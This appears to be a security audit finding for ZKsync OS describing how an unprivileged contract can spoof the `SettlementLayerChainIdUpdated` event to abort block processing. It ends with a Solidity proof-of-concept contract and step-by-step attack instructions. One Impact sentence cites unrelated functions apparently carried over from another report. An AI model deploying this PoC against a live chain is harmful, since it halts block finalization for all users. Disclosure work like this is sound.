### Title
Unprivileged Contract Can Spoof `SettlementLayerChainIdUpdated` Event to Cause Block-Level DoS via Double-Update Guard — (`system_hooks/src/event_hooks/system_context.rs`)

---

### Summary

`system_context_event_hook` fires on **any** contract emitting the `SettlementLayerChainIdUpdated` event signature — there is no check that the emitter is `SYSTEM_CONTEXT_ADDRESS`. `NewSettlementLayerChainIdStorage::update` returns an `InternalError` if called more than once per block. An unprivileged user can deploy a contract that emits this event, and if two transactions in the same block both trigger the hook (with the first succeeding), the second call propagates an `InternalError` → `TxError::Internal` → the entire block fails.

---

### Finding Description

**Step 1 — No emitter address check in the hook.**

`system_context_event_hook` only inspects `topics[0]` against `SL_CHAIN_ID_UPDATED_EVENT_SIG`. The function signature does not even receive the emitting contract address:

```rust
pub fn system_context_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    caller_ee: u8,          // EE type, NOT the emitting address
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
``` [1](#0-0) 

Any contract that emits an event whose first topic equals `SL_CHAIN_ID_UPDATED_EVENT_SIG` will trigger the hook.

**Step 2 — The hook calls `update_settlement_layer_chain_id`, which calls `NewSettlementLayerChainIdStorage::update`.** [2](#0-1) 

**Step 3 — `NewSettlementLayerChainIdStorage::update` returns `InternalError` on the second call.**

```rust
pub fn update(&mut self, new_sl_chain_id: U256) -> Result<(), SystemError> {
    if self.value().is_some() {
        return Err(internal_error!(
            "Tried to update settlement layer chain id more than once in a block"
        ).into());
    }
    ...
}
``` [3](#0-2) 

**Step 4 — `InternalError` (a `SystemError::LeafDefect`) is NOT converted to a revert; it propagates fatally.**

The `revert_on_recoverable!` macro converts `LeafRuntime(FatalRuntimeError)` to a revert, but passes `LeafDefect(InternalError)` through as `Err(err)`: [4](#0-3) 

**Step 5 — `TxError::Internal` in the tx loop causes `return Err(err)`, aborting the entire block.**

```rust
Err(TxError::Internal(err)) => {
    system.finish_global_frame(None)?;
    return Err(err);   // entire block fails
}
``` [5](#0-4) 

**Step 6 — The existing test confirms two updates in the same block abort the block entirely.**

```rust
tester
    .execute_block_no_panic(vec![tx1, tx2])
    .expect_err("block with two settlement layer chain id updates should fail");
``` [6](#0-5) 

---

### Impact Explanation

**Impact: High.** An attacker can prevent any block from being finalized. The block processing pipeline (`run_prepared` → `loop_op` → `process_transaction`) returns a `BootloaderSubsystemError`, leaving the chain in a stale state. This is a direct analog to the reported DoS: a critical, must-not-fail path (`generatePerformance` / block processing) is aborted by a guard condition on pending state (`_validatorsWithPendingRebalance` / `new_settlement_layer_chain_id already set`).

---

### Likelihood Explanation

**Likelihood: Medium.** The attacker only needs to:
1. Deploy a contract that emits `SettlementLayerChainIdUpdated(uint256)` with any value.
2. Submit two transactions in the same block calling that contract (ensuring the first is committed, not reverted).

No privileged access, leaked keys, or oracle manipulation is required. The `FullIOStateSnapshot` does not include a `new_settlement_layer_chain_id` field, meaning the value set by the first transaction is not rolled back even if that transaction reverts at the EVM level — making the attack window even wider. [7](#0-6) 

---

### Recommendation

Add an emitting-contract address check inside `system_context_event_hook` (and analogously in `interop_root_reporter_event_hook`). The event hook function signature should be extended to receive the emitting contract address, and the hook should return `Ok(())` immediately if the emitter is not `SYSTEM_CONTEXT_ADDRESS`:

```rust
if emitter != SYSTEM_CONTEXT_ADDRESS {
    return Ok(());
}
``` [1](#0-0) [8](#0-7) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SpoofSLChainId {
    // keccak256("SettlementLayerChainIdUpdated(uint256)")
    bytes32 constant SIG = 0x208daf0b9291c1e9a1697737d736630c808045f81f5bc5ae7b8ed740eb5a4d7a;

    function trigger(uint256 newId) external {
        // Emit the exact event signature the hook listens for
        assembly {
            mstore(0x00, newId)
            log2(0x00, 0x00, SIG, newId)  // topics[0]=SIG, topics[1]=newId, data=empty
        }
    }
}
```

1. Deploy `SpoofSLChainId` on ZKsync OS.
2. Submit `tx1 = spoofContract.trigger(42)` and `tx2 = spoofContract.trigger(43)` in the same block.
3. `tx1` succeeds → `NewSettlementLayerChainIdStorage::update(42)` sets the value.
4. `tx2` fires the hook → `update(43)` returns `InternalError("Tried to update settlement layer chain id more than once in a block")`.
5. `InternalError` propagates as `TxError::Internal` → `return Err(err)` in the tx loop → entire block fails. [3](#0-2) [9](#0-8) [5](#0-4)
